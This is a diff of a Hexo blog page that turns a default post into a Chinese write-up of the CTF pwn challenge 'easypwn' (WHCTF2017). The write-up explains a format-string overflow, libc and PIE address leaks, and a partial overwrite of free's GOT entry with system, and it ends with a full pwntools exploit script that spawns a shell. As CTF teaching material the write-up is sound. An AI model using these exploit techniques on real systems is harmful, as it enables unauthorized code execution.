@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Hello World | sixpar&#39;s blog</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Hello World | sixpar&#39;s blog">
+  <title>攻防世界进阶pwn题-easypwn | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 格式化字串 , partial_write ">
+  <meta name="description" content="攻防世界进阶pwn题-easypwn | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -616,24 +616,41 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-攻防世界进阶pwn题-easypwn" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">Hello World</h1>
+        <h1 class="article-title">攻防世界进阶pwn题-easypwn</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="PWN题">PWN题</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">格式化字串</a>
+            
+            <a class="color4">partial_write</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-02 20:49:04'>2020-07-02 20:49</time>
+            Created At : <time class="date" title='Updated At: 2020-07-17 22:22:25'>2020-07-17 21:19</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:75</span>
+        <span>Count:1.9k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -663,7 +680,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制："><span class="toc-text">保护机制：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序："><span class="toc-text">分析程序：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用："><span class="toc-text">漏洞利用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -679,15 +696,134 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <h2 id="保护机制："><a href="#保护机制：" class="headerlink" title="保护机制："></a>保护机制：</h2><pre><code>Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled</code></pre><h2 id="分析程序："><a href="#分析程序：" class="headerlink" title="分析程序："></a>分析程序：</h2><p>当code输入’1’后，执行sub_B30，程序如下：</p>
+<pre><code class="c">unsigned __int64 sub_B30()
+{
+  char s; // [rsp+10h] [rbp-BF0h]
+  char v2; // [rsp+410h] [rbp-7F0h]
+  __int64 v3; // [rsp+7F8h] [rbp-408h]
+  unsigned __int64 v4; // [rsp+BF8h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  memset(&amp;s, 0, 0x400uLL);
+  memset(&amp;v3, 0, 8uLL);
+  memset(&amp;v2, 0, 0x7E8uLL);
+  LOWORD(v3) = 29477;
+  BYTE2(v3) = 0;
+  puts(&quot;Welcome To WHCTF2017:&quot;);
+  read(0, &amp;s, 0x438uLL);
+  snprintf(&amp;v2, 0x7D0uLL, (const char *)&amp;v3, &amp;s);
+  printf(&quot;Your Input Is :%s\n&quot;, &amp;v2);
+  return __readfsqword(0x28u) ^ v4;
+}</code></pre>
+<p>read语句输入s栈，但不存在溢出，而看到v2栈的大小是 0x7F0-0x408=0x3e8<br>而我们可以输入的大小是 0x7D0，存在溢出漏洞。也就是说v2可以溢出到v3。<br>v3存储着格式化字符，所以可以覆盖修改格式化字符串，做到任意地址读写。</p>
+<p>经过不断的调试，发现snprintf把格式化字符串的地址记下来，然后，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符。由于地址是没变的，变的是地址里面的内容。所以我们覆盖v3的格式化字符是可行的，只要这个位置是什么格式化字符，程序就会照应执行。</p>
+<p>当code输入’2’时，将会分配一个堆，然后读取我们的输入，然后free掉buf。</p>
+<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>思路：<br>利用snprintf处的格式化字符串漏洞，修改free的GOT表，让它指向system，然后我们第二次输入/bin/sh字符串，那么/bin/sh将会存到堆里，当调用free(buf)，时，就相当于执行了system(binsh_addr)，我们就能getshell。</p>
+<p>在IDA远程动态调试的时候，发现栈里有一个__libc_start_main+F0 的地址，我们可以利用snprintf把它的值暴露出来。<br>这样我们再减去0xF0 就相当于知道libc基址了。<br>所以payload：</p>
+<pre><code class="python">sh.sendlineafter(&#39;Input Your Code:\n&#39;,&#39;1&#39;)  
+#泄露__libc_start_main+F0的地址  
+payload = &#39;a&#39;*(0x3E8)+&#39;bb%397$p&#39;  
+sh.sendafter(&#39;Welcome To WHCTF2017:\n&#39;,payload)  
+sh.recvuntil(&#39;0x&#39;)  
+__libc_start_main = int(sh.recvuntil(&#39;\n&#39;),16) - 0xF0  </code></pre>
+<p>这其中的字符’bb’(不能是aa,反正不能与前面的那0x3E8个字符一样，不知道为什么) 是为了覆盖原先的’%s’，根据上面说的snprintf工作过程，snprintf处理前面0x3E8个字符时，用的都是%s来格式化，当处理第一个b时,此时b已经覆盖了%号，格式化字符串变为bs，当处理第二个b时，此时b覆盖了字符s，格式化字符串变成bb。接下来,%397$p被原模原样的覆盖到了bb的后面，也就是最后，格式化字符串变成了bb%397$p，当snprintf读到格式化字符串为bb%397$p，变打印了bb0x[第397个元素的值]</p>
+<p>%397$p就是距栈底397个位置的数据(也就是<strong>libc_start_main+F0)<br>在我们跟踪进入snprintf函数以后，并且还未对rsp做调整时，栈顶rsp为0x7FFD176702D0，然后我们找到</strong>libc_start_main+F0在栈里的位置,为0x7FFD17670F38<br>所以，(0x7FFD17670F38 –0x7FFD176702D0) / 8 = 397<br>偏移就是397啦。<br>发现在__libc_start_main+F0前面的就是init，<br>所以我们利用同样的方法泄露init的地址，init的偏移就是 396 啦。<br>泄露出init的地址后，由于0xDA0为init在二进制文件中的静态地址，所以我们减去 0xDA0后就是 elf基址了。</p>
+<p>然后，我们该如何来修改free的GOT表呢？<br>首先我们不能把p64(addr)放格式化字符串的前面，因为p64(addr)里面有0，会导致snprintf遇到0后就结束，不能读取到我们后来的格式化字符串。<br>所以payload写成这样：<br>payload =  ‘a’*(0x3E8) + (‘bb%’ + str(data - 0x3FE) + ‘c%133$hn’).ljust(16,’a’) + p64(free_addr + 2)<br>其中，%133$hn代表把距栈顶133个位置处的数据当成地址，往那个地址处写一个值，hn表示写一个WORD（字）的数据，也就是2字节数据，这个值就是在这之前snprintf已经打印了多少个字符，把字符个数填进去。<br>ljust(16,’a’)是为了凑出16字节，格式化字符串可能超过8字节，但不会超过16字节，并且，由于要8字节对齐，所以需要补足。<br>那这个133是如何得到的？<br>当进入snprintf，当还没变更rsp时，rsp栈顶为0x7FFF4D0A1BE0，然后我们看到我们输入的数据是从0x 7FFF4D0A1C10开始的<br>于是偏移为<br>(0x 7FFF4D0A1C10 - 0x7FFF4D0A1BE0) / 8 + (0x3E8 + 16) / 8 = 133<br>即 6+127=133</p>
+<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><pre><code class="python">#coding:utf-8
+from pwn import *
+# from LibcSearcher import *
+libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+p=process(&#39;./pwn1&#39;)
+elf=ELF(&#39;./pwn1&#39;)
+
+#这一步是为了加载free对应的got表，调用一次后便有了free的got地址了
+p.sendlineafter(&#39;Input Your Code:\n&#39;,&#39;2&#39;)
+p.sendlineafter(&#39;Input Your Name:\n&#39;,&#39;sixpar&#39;)
+
+#泄露__libc_start_main+F0的地址  
+p.sendlineafter(&#39;Input Your Code:\n&#39;,&#39;1&#39;)
+payload=&#39;a&#39;*0x3E8+&#39;bb%397$p&#39;
+# 0x3E8 = 0x7F0(v3位置) – 0x408(v2位置)
+#也就是从v2位置输入0x3EB个字节后可以覆盖v3数据
+p.sendlineafter(&#39;Welcome To WHCTF2017:\n&#39;,payload)
+p.recvuntil(&#39;0x&#39;)
+libc_start_main_addr=int(p.recvuntil(&#39;\n&#39;).strip(),16)-0xF0
+print &quot;libc_start_main_addr is:&quot;+hex(libc_start_main_addr)
+
+# libc基址
+# libc=LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr)
+# libc_base=libc_start_main_addr-libc.dump(&#39;__libc_start_main&#39;)
+# system_addr=libc_base+libc.dump(&#39;system&#39;)
+libc_base=libc_start_main_addr-libc.symbols[&#39;__libc_start_main&#39;]
+system_addr=libc_base+libc.symbols[&#39;system&#39;]
+print &quot;libc_base is:&quot;+hex(libc_base)
+print &quot;system_addr is:&quot;+hex(system_addr)
+
+#泄漏init地址：
+p.sendlineafter(&#39;Input Your Code:\n&#39;,&#39;1&#39;)
+payload=&#39;a&#39;*0x3E8+&#39;bb%396$p&#39;
+p.sendlineafter(&#39;Welcome To WHCTF2017:\n&#39;,payload)
+p.recvuntil(&#39;0x&#39;)
+init_addr=int(p.recvuntil(&#39;\n&#39;).strip(),16)
+print &quot;init_addr is:&quot;+hex(init_addr)
+
+#由于0xDA0为init在二进制文件中的静态地址，所以
+elf_base=init_addr-0xDA0
+print &quot;elf_base is:&quot;+hex(elf_base)
+
+#由于PIE所以导致elf基址不知，现在可以得到free_got的实际地址了
+free_addr=elf_base+elf.got[&#39;free&#39;] 
+print &quot;free_addr is:&quot;+hex(free_addr)
+
+# pause()
+#修改free地址的低位字节，使其指向system
+#假如在某次运行中，得到以下地址：
+# libc_start_main_addr is:0x7ff691e97740
+# libc_base is:0x7ff691e77000
+# system_addr is:0x7ff691ebc390
+# init_addr is:0x55bca1690da0
+# elf_base is:0x55bca1690000
+# free_addr is:0x55bca1892018
+#我们可以pause断下exp调试，然后gdb attach pid 的方法查看数据
+#比如查看此时free地址的内容：
+# gdb-peda$ x/20xg 0x55bca1892018
+# 0x55bca1892018:    0x00007ff691efb4f0    0x00007ff691ee6690
+#可以看到此时free指向的是0x00007ff691efb4f0，我们得把这个地址改为system的才行
+#比对一下：
+#0x00007ff691efb4f0
+#0x00007ff691ebc390  &lt;== system地址
+#发现只需要修改后仨字节即可， 这种手法叫做partial write
+
+
+# 修改倒数第3.4字节
+p.sendlineafter(&#39;Input Your Code:\n&#39;,&#39;1&#39;)
+_3_4_data=(system_addr &amp;0xFFFFFFFF)&gt;&gt;16
+payload1=&#39;a&#39;*0x3E8+(&#39;bb%&#39;+str(_3_4_data-0x3fe)+&#39;c%133$hn&#39;).ljust(16,&#39;a&#39;)+p64(free_addr+2)
+#解释一下这里为什么是0x3fe
+#个人认为就是还要算上程序打印出来的字符，即‘Welcome To WHCTF2017:\n’，
+# len(&#39;Welcome To WHCTF2017:\n&#39;) 刚好就等于22字节
+# 0x3e8+22=0x3fe ，解释的通
+p.sendlineafter(&#39;Welcome To WHCTF2017:\n&#39;,payload1)
+
+#修改倒数第1,2字节
+p.sendlineafter(&#39;Input Your Code:\n&#39;,&#39;1&#39;)
+_1_2_data=system_addr &amp;0xFFFF
+payload2=&#39;a&#39;*0x3E8+(&#39;bb%&#39;+str(_1_2_data-0x3fe)+&#39;c%133$hn&#39;).ljust(16,&#39;a&#39;)+p64(free_addr)
+p.sendlineafter(&#39;Welcome To WHCTF2017:\n&#39;,payload2)
+
+#getshell
+p.sendlineafter(&#39;Input Your Code:\n&#39;,&#39;2&#39;)
+p.sendlineafter(&#39;Input Your Name:\n&#39;,&#39;/bin/sh&#39;)
+p.interactive()
+</code></pre>
+<p>本题可以用Libcsearcher，但是我还是用本地的libc库好了，也是适用的。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>本题exp还是能理解的，主要还是学一下 partial write的手法，<br>这个 (system_addr &amp;0xFFFFFFFF)&gt;&gt;16 太神了。<br>得出的结果是37355，然后hex(37355)=0x91eb ，就很神奇。</p>
+<p>还有，本题中关于IDA动态调试也是很重要的，图片以后补吧。<br>今天就到此结束咯。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
